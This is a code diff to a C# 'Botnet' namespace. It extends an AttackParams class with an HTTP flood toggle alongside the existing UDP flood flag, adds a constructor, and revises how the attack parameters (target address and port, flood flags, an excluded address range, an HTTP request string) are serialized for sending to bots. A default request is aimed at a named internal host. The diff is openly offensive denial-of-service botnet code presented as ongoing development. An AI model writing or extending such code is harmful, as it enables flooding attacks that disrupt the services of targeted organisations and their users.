@@ -10,6 +10,7 @@ namespace Botnet
     {
         public IPEndPoint Target;
         public bool UdpFloodEnabled;
+        public bool HttpFloodEnabled;
         public NetworkInstruments.AddressPool RestrictedPool;
         public string HttpMsg;
         public AttackParams(IPEndPoint Target, string HttpMsg, NetworkInstruments.AddressPool RestrictedPool)
@@ -17,6 +18,7 @@ namespace Botnet
             this.Target = Target;
             this.HttpMsg = HttpMsg;
             UdpFloodEnabled = true;
+            HttpFloodEnabled = true;
             this.RestrictedPool = RestrictedPool;
         }
         public AttackParams(IPEndPoint Target, string HttpMsg)
@@ -24,7 +26,16 @@ namespace Botnet
             this.Target = Target;
             this.HttpMsg = HttpMsg;
             UdpFloodEnabled = false;
+            HttpFloodEnabled = true;
             this.RestrictedPool = new NetworkInstruments.AddressPool(IPAddress.Any, IPAddress.Any); //make sure they are empty
+        }
+        public AttackParams(IPEndPoint Target, NetworkInstruments.AddressPool RestrictedPool)
+        {
+            this.Target = Target;
+            this.HttpMsg = "";
+            UdpFloodEnabled = true;
+            HttpFloodEnabled = false;
+            this.RestrictedPool = RestrictedPool;
         }
         public AttackParams()
         {
@@ -37,6 +48,7 @@ namespace Botnet
                 Target = new IPEndPoint(IPAddress.Any, 80);
             }
             UdpFloodEnabled = true;
+            HttpFloodEnabled = true;
             RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getLocaIP(), NetworkInstruments.getLocaIP());
             HttpMsg = "GET http://cinema.eastoffice.companyname/index.php/ HTTP/1.1\r\n" +
                 "Host: cinema.eastoffice.companyname\r\n" +
@@ -51,26 +63,28 @@ namespace Botnet
             byte[] rest1 = new byte[4];
             byte[] rest2 = new byte[4];
             Array.Copy(ParamsArray, 0, Targip, 0, 4);
-            Array.Copy(ParamsArray, 7, rest1, 0, 4);
-            Array.Copy(ParamsArray, 11, rest2, 0, 4);
+            Array.Copy(ParamsArray, 8, rest1, 0, 4);
+            Array.Copy(ParamsArray, 12, rest2, 0, 4);
             Params.Target = new IPEndPoint(new IPAddress(Targip), BitConverter.ToUInt16(ParamsArray, 4));
-            Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
+            Params.HttpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
+            Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[7]);
             Params.RestrictedPool = new NetworkInstruments.AddressPool(new IPAddress(new byte[] { rest1[0], rest1[1], rest1[2], rest1[3] }), new IPAddress(new byte[] { rest2[0], rest2[1], rest2[2], rest2[3] }));
-            byte[] httpmsg = new byte[ParamsArray.Length - 15];
-            Array.Copy(ParamsArray, 15, httpmsg, 0, httpmsg.Length);
+            byte[] httpmsg = new byte[ParamsArray.Length - 16];
+            Array.Copy(ParamsArray, 16, httpmsg, 0, httpmsg.Length);
             Params.HttpMsg = System.Text.Encoding.ASCII.GetString(httpmsg);
             return Params;
         }
         public byte[] GetBytes()
         {
-            //target ip + port + udpmark+ restpool + http msg
-            List<byte> res = new List<byte>(15);
+            //target ip + port + httpmark + udpmark+ restpool + http msg
+            List<byte> res = new List<byte>(16);
             byte[] targetip = Target.Address.GetAddressBytes();
             byte[] port = BitConverter.GetBytes(Convert.ToUInt16(Target.Port));
             byte[] rpool0 = RestrictedPool[0].GetAddressBytes();
             byte[] rpool1 = RestrictedPool[1].GetAddressBytes();
             res.AddRange(targetip);
             res.AddRange(port);
+            res.Add(Convert.ToByte(HttpFloodEnabled));
             res.Add(Convert.ToByte(UdpFloodEnabled));
             res.AddRange(rpool0);
             res.AddRange(rpool1);
